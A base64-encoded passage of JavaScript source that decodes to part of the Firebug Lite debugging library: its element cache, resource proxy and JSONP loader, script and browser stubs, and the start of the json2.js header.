xpdGUuQ2FjaGUgPSANCnsNCiAgICBJRDogImZpcmVidWctIiArIG5ldyBEYXRlKCkuZ2V0VGltZSgpDQp9Ow0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KLyoqDQogKiBUT0RPOiBpZiBhIGNhY2hlZCBlbGVtZW50IGlzIGNsb25lZCwgdGhlIGV4cGFuZG8gcHJvcGVydHkgd2lsbCBiZSBjbG9uZWQgdG9vIGluIElFDQogKiB3aGljaCB3aWxsIHJlc3VsdCBpbiBhIGJ1Zy4gRmlyZWJ1ZyBMaXRlIHdpbGwgdGhpbmsgdGhlIG5ldyBjbG9uZWQgbm9kZSBpcyB0aGUgb2xkDQogKiBvbmUuDQogKiANCiAqIFRPRE86IEludmVzdGlnYXRlIGEgcG9zc2liaWxpdHkgb2YgY2FjaGUgdmFsaWRhdGlvbiwgdG8gYmUgY3VzdG9taXplZCBieSBlYWNoIA0KICoga2luZCBvZiBjYWNoZS4gRm9yIEVsZW1lbnRDYWNoZSBpdCBzaG91bGQgdmFsaWRhdGUgaWYgdGhlIGVsZW1lbnQgc3RpbGwgaXMgDQogKiBpbnNlcnRlZCBhdCB0aGUgRE9NLg0KICovIA0KdmFyIGNhY2hlVUlEID0gMDsNCnZhciBjcmVhdGVDYWNoZSA9IGZ1bmN0aW9uKCkNCnsNCiAgICB2YXIgbWFwID0ge307DQogICAgdmFyIGRhdGEgPSB7fTsNCiAgICANCiAgICB2YXIgQ0lEID0gRmlyZWJ1Zy5MaXRlLkNhY2hlLklEOw0KICAgIA0KICAgIC8vIGJldHRlciBkZXRlY3Rpb24NCiAgICB2YXIgc3VwcG9ydHNEZWxldGVFeHBhbmRvID0gIWRvY3VtZW50LmFsbDsNCiAgICANCiAgICB2YXIgY2FjaGVGdW5jdGlvbiA9IGZ1bmN0aW9uKGVsZW1lbnQpDQogICAgew0KICAgICAgICByZXR1cm4gY2FjaGVBUEkuc2V0KGVsZW1lbnQpOw0KICAgIH07DQogICAgDQogICAgdmFyIGNhY2hlQVBJID0gIA0KICAgIHsNCiAgICAgICAgZ2V0OiBmdW5jdGlvbihrZXkpDQogICAgICAgIHsNCiAgICAgICAgICAgIHJldHVybiBtYXAuaGFzT3duUHJvcGVydHkoa2V5KSA/DQogICAgICAgICAgICAgICAgICAgIG1hcFtrZXldIDoNCiAgICAgICAgICAgICAgICAgICAgbnVsbDsNCiAgICAgICAgfSwNCiAgICAgICAgDQogICAgICAgIHNldDogZnVuY3Rpb24oZWxlbWVudCkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIGlkID0gZ2V0VmFsaWRhdGVkS2V5KGVsZW1lbnQpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoIWlkKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlkID0gKytjYWNoZVVJRDsNCiAgICAgICAgICAgICAgICBlbGVtZW50W0NJRF0gPSBpZDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKCFtYXAuaGFzT3duUHJvcGVydHkoaWQpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIG1hcFtpZF0gPSBlbGVtZW50Ow0KICAgICAgICAgICAgICAgIGRhdGFbaWRdID0ge307DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIHJldHVybiBpZDsNCiAgICAgICAgfSwNCiAgICAgICAgDQogICAgICAgIHVuc2V0OiBmdW5jdGlvbihlbGVtZW50KQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgaWQgPSBnZXRWYWxpZGF0ZWRLZXkoZWxlbWVudCk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmICghaWQpIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKHN1cHBvcnRzRGVsZXRlRXhwYW5kbykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBkZWxldGUgZWxlbWVudFtDSURdOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZSBpZiAoZWxlbWVudC5yZW1vdmVBdHRyaWJ1dGUpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZWxlbWVudC5yZW1vdmVBdHRyaWJ1dGUoQ0lEKTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgZGVsZXRlIG1hcFtpZF07DQogICAgICAgICAgICBkZWxldGUgZGF0YVtpZF07DQogICAgICAgICAgICANCiAgICAgICAgfSwNCiAgICAgICAgDQogICAgICAgIGtleTogZnVuY3Rpb24oZWxlbWVudCkNCiAgICAgICAgew0KICAgICAgICAgICAgcmV0dXJuIGdldFZhbGlkYXRlZEtleShlbGVtZW50KTsNCiAgICAgICAgfSwNCiAgICAgICAgDQogICAgICAgIGhhczogZnVuY3Rpb24oZWxlbWVudCkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIGlkID0gZ2V0VmFsaWRhdGVkS2V5KGVsZW1lbnQpOw0KICAgICAgICAgICAgcmV0dXJuIGlkICYmIG1hcC5oYXNPd25Qcm9wZXJ0eShpZCk7DQogICAgICAgIH0sDQogICAgICAgIA0KICAgICAgICBlYWNoOiBmdW5jdGlvbihjYWxsYmFjaykNCiAgICAgICAgew0KICAgICAgICAgICAgZm9yICh2YXIga2V5IGluIG1hcCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAobWFwLmhhc093blByb3BlcnR5KGtleSkpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBjYWxsYmFjayhrZXksIG1hcFtrZXldKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0sDQogICAgICAgIA0KICAgICAgICBkYXRhOiBmdW5jdGlvbihlbGVtZW50LCBuYW1lLCB2YWx1ZSkNCiAgICAgICAgew0KICAgICAgICAgICAgLy8gc2V0IGRhdGENCiAgICAgICAgICAgIGlmICh2YWx1ZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAoIW5hbWUpIHJldHVybiBudWxsOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHZhciBpZCA9IGNhY2hlQVBJLnNldChlbGVtZW50KTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICByZXR1cm4gZGF0YVtpZF1bbmFtZV0gPSB2YWx1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIC8vIGdldCBkYXRhDQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIGlkID0gY2FjaGVBUEkua2V5KGVsZW1lbnQpOw0KDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGEuaGFzT3duUHJvcGVydHkoaWQpICYmIGRhdGFbaWRdLmhhc093blByb3BlcnR5KG5hbWUpID8NCiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGFbaWRdW25hbWVdIDoNCiAgICAgICAgICAgICAgICAgICAgICAgIG51bGw7DQogICAgICAgICAgICB9DQogICAgICAgIH0sDQogICAgICAgIA0KICAgICAgICBjbGVhcjogZnVuY3Rpb24oKQ0KICAgICAgICB7DQogICAgICAgICAgICBmb3IgKHZhciBpZCBpbiBtYXApDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIGVsZW1lbnQgPSBtYXBbaWRdOw0KICAgICAgICAgICAgICAgIGNhY2hlQVBJLnVuc2V0KGVsZW1lbnQpOyAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH07DQogICAgDQogICAgdmFyIGdldFZhbGlkYXRlZEtleSA9IGZ1bmN0aW9uKGVsZW1lbnQpDQogICAgew0KICAgICAgICB2YXIgaWQgPSBlbGVtZW50W0NJRF07DQogICAgICAgIA0KICAgICAgICAvLyBJZiBhIGNhY2hlZCBlbGVtZW50IGlzIGNsb25lZCBpbiBJRSwgdGhlIGV4cGFuZG8gcHJvcGVydHkgQ0lEIHdpbGwgYmUgYWxzbyANCiAgICAgICAgLy8gY2xvbmVkIChkaWZmZXJlbnRseSB0aGFuIG90aGVyIGJyb3dzZXJzKSByZXN1bHRpbmcgaW4gYSBidWc6IEZpcmVidWcgTGl0ZSANCiAgICAgICAgLy8gd2lsbCB0aGluayB0aGUgbmV3IGNsb25lZCBub2RlIGlzIHRoZSBvbGQgb25lLiBUbyBwcmV2ZW50IHRoaXMgcHJvYmxlbSB3ZSdyZSANCiAgICAgICAgLy8gY2hlY2tpbmcgaWYgdGhlIGNhY2hlZCBlbGVtZW50IG1hdGNoZXMgdGhlIGdpdmVuIGVsZW1lbnQuDQogICAgICAgIGlmICgNCiAgICAgICAgICAgICFzdXBwb3J0c0RlbGV0ZUV4cGFuZG8gJiYgICAvLyB0aGUgcHJvYmxlbSBoYXBwZW5zIHdoZW4gc3VwcG9ydHNEZWxldGVFeHBhbmRvIGlzIGZhbHNlDQogICAgICAgICAgICBpZCAmJiAgICAgICAgICAgICAgICAgICAgICAgLy8gdGhlIGVsZW1lbnQgaGFzIHRoZSBleHBhbmRvIHByb3BlcnR5IA0KICAgICAgICAgICAgbWFwLmhhc093blByb3BlcnR5KGlkKSAmJiAgIC8vIHRoZXJlIGlzIGEgY2FjaGVkIGVsZW1lbnQgd2l0aCB0aGUgc2FtZSBpZA0KICAgICAgICAgICAgbWFwW2lkXSAhPSBlbGVtZW50ICAgICAgICAgIC8vIGJ1dCBpdCBpcyBhIGRpZmZlcmVudCBlbGVtZW50IHRoYW4gdGhlIGN1cnJlbnQgb25lDQogICAgICAgICAgICApDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vIHJlbW92ZSB0aGUgcHJvYmxlbWF0aWMgcHJvcGVydHkNCiAgICAgICAgICAgIGVsZW1lbnQucmVtb3ZlQXR0cmlidXRlKENJRCk7DQoNCiAgICAgICAgICAgIGlkID0gbnVsbDsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgcmV0dXJuIGlkOw0KICAgIH07DQogICAgDQogICAgRkJMLmFwcGVuZChjYWNoZUZ1bmN0aW9uLCBjYWNoZUFQSSk7DQogICAgDQogICAgcmV0dXJuIGNhY2hlRnVuY3Rpb247DQp9Ow0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KLy8gVE9ETzogeHh4cGVkcm8gOiBjaGVjayBpZiB3ZSBuZWVkIHJlYWxseSB0aGlzIG9uIEZCTCBzY29wZQ0KRmlyZWJ1Zy5MaXRlLkNhY2hlLlN0eWxlU2hlZXQgPSBjcmVhdGVDYWNoZSgpOw0KRmlyZWJ1Zy5MaXRlLkNhY2hlLkVsZW1lbnQgPSBjcmVhdGVDYWNoZSgpOw0KDQovLyBUT0RPOiB4eHhwZWRybw0KRmlyZWJ1Zy5MaXRlLkNhY2hlLkV2ZW50ID0gY3JlYXRlQ2FjaGUoKTsNCg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCn19KTsNCg0KDQovKiBTZWUgbGljZW5zZS50eHQgZm9yIHRlcm1zIG9mIHVzYWdlICovDQoNCkZCTC5ucyhmdW5jdGlvbigpIHsgd2l0aCAoRkJMKSB7DQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQp2YXIgc291cmNlTWFwID0ge307DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KRmlyZWJ1Zy5MaXRlLlByb3h5ID0gDQp7DQogICAgLy8ganNvbnAgY2FsbGJhY2tzDQogICAgX2NhbGxiYWNrczoge30sDQogICAgDQogICAgLyoqDQogICAgICogTG9hZCBhIHJlc291cmNlLCBlaXRoZXIgbG9jYWxseSAoZGlyZWN0bHkpIG9yIGV4dGVybmFsbHkgKHZpYSBwcm94eSkgdXNpbmcgDQogICAgICogc3luY2hyb25vdXMgWEhSIGNhbGxzLiBMb2FkaW5nIGV4dGVybmFsIHJlc291cmNlcyByZXF1aXJlcyB0aGUgcHJveHkgcGx1Z2luIHRvDQogICAgICogYmUgaW5zdGFsbGVkIGFuZCBjb25maWd1cmVkIChzZWUgL3BsdWdpbi9wcm94eS9wcm94eS5waHApLg0KICAgICAqLw0KICAgIGxvYWQ6IGZ1bmN0aW9uKHVybCkNCiAgICB7DQogICAgICAgIHZhciByZXNvdXJjZURvbWFpbiA9IGdldERvbWFpbih1cmwpOw0KICAgICAgICB2YXIgaXNMb2NhbFJlc291cmNlID0NCiAgICAgICAgICAgIC8vIGVtcHR5IGRvbWFpbiBtZWFucyBsb2NhbCBVUkwNCiAgICAgICAgICAgICFyZXNvdXJjZURvbWFpbiB8fA0KICAgICAgICAgICAgLy8gc2FtZSBkb21haW4gbWVhbnMgbG9jYWwgdG9vDQogICAgICAgICAgICByZXNvdXJjZURvbWFpbiA9PSAgRmlyZWJ1Zy5jb250ZXh0LndpbmRvdy5sb2NhdGlvbi5ob3N0OyAvLyBUT0RPOiB4eHhwZWRybyBjb250ZXh0DQogICAgICAgIA0KICAgICAgICByZXR1cm4gaXNMb2NhbFJlc291cmNlID8gZmV0Y2hSZXNvdXJjZSh1cmwpIDogZmV0Y2hQcm94eVJlc291cmNlKHVybCk7DQogICAgfSwNCiAgICANCiAgICAvKioNCiAgICAgKiBMb2FkIGEgcmVzb3VyY2UgdXNpbmcgSlNPTlAgdGVjaG5pcXVlLg0KICAgICAqLw0KICAgIGxvYWRKU09OUDogZnVuY3Rpb24odXJsLCBjYWxsYmFjaykNCiAgICB7DQogICAgICAgIHZhciBzY3JpcHQgPSBjcmVhdGVHbG9iYWxFbGVtZW50KCJzY3JpcHQiKSwNCiAgICAgICAgICAgIGRvYyA9IEZpcmVidWcuY29udGV4dC5kb2N1bWVudCwNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdWlkID0gIiIgKyBuZXcgRGF0ZSgpLmdldFRpbWUoKSwNCiAgICAgICAgICAgIGNhbGxiYWNrTmFtZSA9ICJjYWxsYmFjaz1GaXJlYnVnLkxpdGUuUHJveHkuX2NhbGxiYWNrcy4iICsgdWlkLA0KICAgICAgICAgICAgDQogICAgICAgICAgICBqc29ucFVSTCA9IHVybC5pbmRleE9mKCI/IikgIT0gLTEgPyANCiAgICAgICAgICAgICAgICAgICAgdXJsICsgIiYiICsgY2FsbGJhY2tOYW1lIDoNCiAgICAgICAgICAgICAgICAgICAgdXJsICsgIj8iICsgY2FsbGJhY2tOYW1lOw0KICAgICAgICAgICAgDQogICAgICAgIEZpcmVidWcuTGl0ZS5Qcm94eS5fY2FsbGJhY2tzW3VpZF0gPSBmdW5jdGlvbihkYXRhKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoY2FsbGJhY2spDQogICAgICAgICAgICAgICAgY2FsbGJhY2soZGF0YSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIHNjcmlwdC5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKHNjcmlwdCk7DQogICAgICAgICAgICBkZWxldGUgRmlyZWJ1Zy5MaXRlLlByb3h5Ll9jYWxsYmFja3NbdWlkXTsNCiAgICAgICAgfTsNCiAgICAgICAgDQogICAgICAgIHNjcmlwdC5zcmMgPSBqc29ucFVSTDsNCiAgICAgICAgDQogICAgICAgIGlmIChkb2MuZG9jdW1lbnRFbGVtZW50KQ0KICAgICAgICAgICAgZG9jLmRvY3VtZW50RWxlbWVudC5hcHBlbmRDaGlsZChzY3JpcHQpOw0KICAgIH0sDQogICAgDQogICAgLyoqDQogICAgICogTG9hZCBhIHJlc291cmNlIHVzaW5nIFlRTCAobm90IHJlbGlhYmxlKS4NCiAgICAgKi8NCiAgICBZUUw6IGZ1bmN0aW9uKHVybCwgY2FsbGJhY2spDQogICAgew0KICAgICAgICB2YXIgeXFsID0gImh0dHA6Ly9xdWVyeS55YWhvb2FwaXMuY29tL3YxL3B1YmxpYy95cWw/cT1zZWxlY3QlMjAqJTIwZnJvbSUyMGh0bWwlMjB3aGVyZSUyMHVybCUzRCUyMiIgKw0KICAgICAgICAgICAgICAgIGVuY29kZVVSSUNvbXBvbmVudCh1cmwpICsgIiUyMiZmb3JtYXQ9eG1sIjsNCiAgICAgICAgDQogICAgICAgIHRoaXMubG9hZEpTT05QKHlxbCwgZnVuY3Rpb24oZGF0YSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHNvdXJjZSA9IGRhdGEucmVzdWx0c1swXTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gY2xlYW4gdXAgWVFMIGJvZ3VzIGVsZW1lbnRzDQogICAgICAgICAgICB2YXIgbWF0Y2ggPSAvPGJvZHk+XHMrPHA+KFtcc1xTXSspPFwvcD5ccys8XC9ib2R5PiQvLmV4ZWMoc291cmNlKTsNCiAgICAgICAgICAgIGlmIChtYXRjaCkNCiAgICAgICAgICAgICAgICBzb3VyY2UgPSBtYXRjaFsxXTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc29sZS5sb2coc291cmNlKTsNCiAgICAgICAgfSk7DQogICAgfQ0KfTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCkZpcmVidWcuTGl0ZS5Qcm94eS5mZXRjaFJlc291cmNlRGlzYWJsZWRNZXNzYWdlID0gDQogICAgIi8qIEZpcmVidWcgTGl0ZSByZXNvdXJjZSBmZXRjaGluZyBpcyBkaXNhYmxlZC5cbiIgKw0KICAgICJUbyBlbmFibGVkIGl0IHNldCB0aGUgRmlyZWJ1ZyBMaXRlIG9wdGlvbiBcImRpc2FibGVSZXNvdXJjZUZldGNoaW5nXCIgdG8gXCJmYWxzZVwiLlxuIiArDQogICAgIk1vcmUgaW5mbyBhdCBodHRwOi8vZ2V0ZmlyZWJ1Zy5jb20vZmlyZWJ1Z2xpdGUjT3B0aW9ucyAqLyI7DQoNCnZhciBmZXRjaFJlc291cmNlID0gZnVuY3Rpb24odXJsKQ0Kew0KICAgIGlmIChGaXJlYnVnLmRpc2FibGVSZXNvdXJjZUZldGNoaW5nKQ0KICAgIHsNCiAgICAgICAgdmFyIHNvdXJjZSA9IHNvdXJjZU1hcFt1cmxdID0gRmlyZWJ1Zy5MaXRlLlByb3h5LmZldGNoUmVzb3VyY2VEaXNhYmxlZE1lc3NhZ2U7DQogICAgICAgIHJldHVybiBzb3VyY2U7DQogICAgfQ0KDQogICAgaWYgKHNvdXJjZU1hcC5oYXNPd25Qcm9wZXJ0eSh1cmwpKQ0KICAgICAgICByZXR1cm4gc291cmNlTWFwW3VybF07DQoNCiAgICAvLyBHZXR0aW5nIHRoZSBuYXRpdmUgWEhSIG9iamVjdCBzbyBvdXIgY2FsbHMgd29uJ3QgYmUgbG9nZ2VkIGluIHRoZSBDb25zb2xlIFBhbmVsDQogICAgdmFyIHhociA9IEZCTC5nZXROYXRpdmVYSFJPYmplY3QoKTsNCiAgICB4aHIub3BlbigiZ2V0IiwgdXJsLCBmYWxzZSk7DQogICAgeGhyLnNlbmQoKTsNCiAgICANCiAgICB2YXIgc291cmNlID0gc291cmNlTWFwW3VybF0gPSB4aHIucmVzcG9uc2VUZXh0OyANCiAgICByZXR1cm4gc291cmNlOw0KfTsNCg0KdmFyIGZldGNoUHJveHlSZXNvdXJjZSA9IGZ1bmN0aW9uKHVybCkNCnsNCiAgICBpZiAoc291cmNlTWFwLmhhc093blByb3BlcnR5KHVybCkpDQogICAgICAgIHJldHVybiBzb3VyY2VNYXBbdXJsXTsNCg0KICAgIHZhciBwcm94eVVSTCA9IEVudi5Mb2NhdGlvbi5iYXNlRGlyICsgInBsdWdpbi9wcm94eS9wcm94eS5waHA/dXJsPSIgKyBlbmNvZGVVUklDb21wb25lbnQodXJsKTsNCiAgICB2YXIgcmVzcG9uc2UgPSBmZXRjaFJlc291cmNlKHByb3h5VVJMKTsNCiAgICANCiAgICB0cnkNCiAgICB7DQogICAgICAgIHZhciBkYXRhID0gZXZhbCgiKCIgKyByZXNwb25zZSArICIpIik7DQogICAgfQ0KICAgIGNhdGNoKEUpDQogICAgew0KICAgICAgICByZXR1cm4gIkVSUk9SOiBGaXJlYnVnIExpdGUgUHJveHkgcGx1Z2luIHJldHVybmVkIGFuIGludmFsaWQgcmVzcG9uc2UuIjsNCiAgICB9DQogICAgDQogICAgdmFyIHNvdXJjZSA9IGRhdGEgPyBkYXRhLmNvbnRlbnRzIDogIiI7IA0KICAgIHJldHVybiBzb3VyY2U7DQp9Ow0KICAgIA0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCn19KTsNCg0KDQovKiBTZWUgbGljZW5zZS50eHQgZm9yIHRlcm1zIG9mIHVzYWdlICovDQoNCkZCTC5ucyhmdW5jdGlvbigpIHsgd2l0aCAoRkJMKSB7DQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KRmlyZWJ1Zy5MaXRlLlN0eWxlID0gDQp7DQp9Ow0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCn19KTsNCg0KDQovKiBTZWUgbGljZW5zZS50eHQgZm9yIHRlcm1zIG9mIHVzYWdlICovDQoNCkZCTC5ucyhmdW5jdGlvbigpIHsgd2l0aCAoRkJMKSB7DQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KRmlyZWJ1Zy5MaXRlLlNjcmlwdCA9IGZ1bmN0aW9uKHdpbmRvdykNCnsNCiAgICB0aGlzLmZpbGVOYW1lID0gbnVsbDsNCiAgICB0aGlzLmlzVmFsaWQgPSBudWxsOw0KICAgIHRoaXMuYmFzZUxpbmVOdW1iZXIgPSBudWxsOw0KICAgIHRoaXMubGluZUV4dGVudCA9IG51bGw7DQogICAgdGhpcy50YWcgPSBudWxsOw0KICAgIA0KICAgIHRoaXMuZnVuY3Rpb25OYW1lID0gbnVsbDsNCiAgICB0aGlzLmZ1bmN0aW9uU291cmNlID0gbnVsbDsNCn07DQoNCkZpcmVidWcuTGl0ZS5TY3JpcHQucHJvdG90eXBlID0gDQp7DQogICAgaXNMaW5lRXhlY3V0YWJsZTogZnVuY3Rpb24oKXt9LA0KICAgIHBjVG9MaW5lOiBmdW5jdGlvbigpe30sDQogICAgbGluZVRvUGM6IGZ1bmN0aW9uKCl7fSwNCiAgICANCiAgICB0b1N0cmluZzogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuICJGaXJlYnVnLkxpdGUuU2NyaXB0IjsNCiAgICB9DQp9Ow0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCn19KTsNCg0KDQovKiBTZWUgbGljZW5zZS50eHQgZm9yIHRlcm1zIG9mIHVzYWdlICovDQoNCkZCTC5ucyhmdW5jdGlvbigpIHsgd2l0aCAoRkJMKSB7DQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KDQpGaXJlYnVnLkxpdGUuQnJvd3NlciA9IGZ1bmN0aW9uKHdpbmRvdykNCnsNCiAgICB0aGlzLmNvbnRlbnRXaW5kb3cgPSB3aW5kb3c7DQogICAgdGhpcy5jb250ZW50RG9jdW1lbnQgPSB3aW5kb3cuZG9jdW1lbnQ7DQogICAgdGhpcy5jdXJyZW50VVJJID0gDQogICAgew0KICAgICAgICBzcGVjOiB3aW5kb3cubG9jYXRpb24uaHJlZg0KICAgIH07DQp9Ow0KDQpGaXJlYnVnLkxpdGUuQnJvd3Nlci5wcm90b3R5cGUgPSANCnsNCiAgICB0b1N0cmluZzogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuICJGaXJlYnVnLkxpdGUuQnJvd3NlciI7DQogICAgfQ0KfTsNCg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCn19KTsNCg0KDQovKiBTZWUgbGljZW5zZS50eHQgZm9yIHRlcm1zIG9mIHVzYWdlICovDQoNCi8qDQogICAgaHR0cDovL3d3dy5KU09OLm9yZy9qc29uMi5qcw0KICAgIDIwMTAtMDMtMjANCg0KICAgIFB1YmxpYyBEb21haW4uDQoNCiAgICBOTyBXQVJSQU5UWSBFWFBSRVNTRUQgT1IgSU1QTElFRC4gVVNFIEFUIFlPVVIgT1dOIFJJU0suDQoNCiAgICBTZWUgaHR0cDovL3d3dy5KU09OLm9yZy9qcy5odG1sDQoNCg0KICAgIFRoaXMgY29kZSBzaG91bGQgYmUgbWluaWZpZWQgYmVmb3JlIGRlcGxveW1lbnQuDQogICAgU2VlIGh0dHA6Ly9qYXZhc2NyaXB0LmNyb2NrZm9yZC5jb20vanNtaW4uaHRtbA0KDQogICAgVVNFIFlPVVIgT1dOIENPUFkuIElUIElTIEVYVFJFTUVMWSBVTldJU0UgVE8gTE9BRCBDT0RFIEZST00gU0VSVkVSUyBZT1UgRE8NCiAgICBOT1QgQ09OVFJPTC4NCg0KDQogICAgVGhpcyBmaWxlIGNyZWF0ZXMgYSBnbG9iYWwgSlNPTiBvYmplY3QgY29udGFpbmluZyB0d28gbWV0aG9kczogc3RyaW5naWZ5DQogICAgYW5kIHBhcnNlLg0KDQogICAgICAgIEpTT04uc3RyaW5naWZ5KHZhbHVlLCByZXBsYWNlciwgc3BhY2UpDQogICAgICAgICAgICB2YWx1ZSAgICAgICBhbnkgSmF2YVNjcmlwdCB2YWx1ZSwgdXN1YWxseSBhbiBvYmplY3Qgb3IgYXJyYXkuDQoNCiAgICAgICAgICAgIHJlcGxhY2VyICAgIGFuIG9wdGlvbmFsIHBhcmFtZXRlciB0aGF0IGRldGVybWluZXMgaG93IG9iamVjdA0KICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWVzIGFyZSBzdHJpbmdpZmllZCBmb3Igb2JqZWN0cy4gSXQgY2FuIGJlIGENCiAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uIG9yIGFuIGFycmF5IG9mIHN0cmluZ3MuDQoNCiAgICAgICAgICAgIHNwYWNlICAgICAgIGFuIG9wdGlvbmFsIHBhcmFtZXRlciB0aGF0IHNwZWNpZmllcyB0aGUgaW5kZW50YXRpb24NCiAgICAgICAgICAgICAgICAgICAgICAgIG9mIG5lc3RlZCBzdHJ1Y3R1cmVzLiBJZiBpdCBpcyBvbWl0dGVkLCB0aGUgdGV4dCB3aWxsDQogICAgICAgICAgICAgICAgICAgICAgICBiZSBwYWNrZWQgd2l0aG91dCBleHRyYSB3aGl0ZXNwYWNlLiBJZiBpdCBpcyBhIG51bWJlciwNCiAgICAgICAgICAgICAgICAgICAgICAgIGl0IHdpbGwgc3BlY2lmeSB0aGUgbnVtYmVyIG9mIHNwYWNlcyB0byBpbmRlbnQgYXQgZWFjaA0KICAgICAgICAgICAgICAgICAgICAgICAgbGV2ZWwuIElmIGl0IGlzIGEgc3RyaW5nIChzdWNoIGFzICdcdCcgb3IgJyZuYnNwOycpLA0KICAgICAgICAgICAgICAgICAgICAgICAgaXQgY29udGFpbnMgdGhlIGNoYXJhY3RlcnMgdXNlZCB0byBpbmRlbnQgYXQgZWFjaCBsZXZlbC4NCg0KICAgICAgICAgICAgVGhpcyBtZXRob2QgcHJvZHVjZXMgYSBKU09OIHRleHQgZnJvbSBhIEphdmFTY3JpcHQgdmFsdWUuDQoNCiAgICAgICAgICAgIFdoZW4gYW4gb2JqZWN0IHZhbHVlIGlzIGZvdW5kLCBpZiB0aGUgb2JqZWN0IGNvbnRhaW5zIGEgdG9KU09ODQogICAgICAgICAgICBtZXRob2QsIGl0cyB0b0pTT04gbWV0aG9kIHdpbGwgYmUgY2FsbGVkIGFuZCB0aGUgcmVzdWx0IHdpbGwgYmUNCiAgICAgICAgICAgIHN0cmluZ2lmaWVkLiBBIHRvSlNPTiBtZXRob2QgZG9lcyBub3Qgc2VyaWFsaXplOiBpdCByZXR1cm5zIHRoZQ0KICAgICAgICAgICAgdmFsdWUgcmVwcm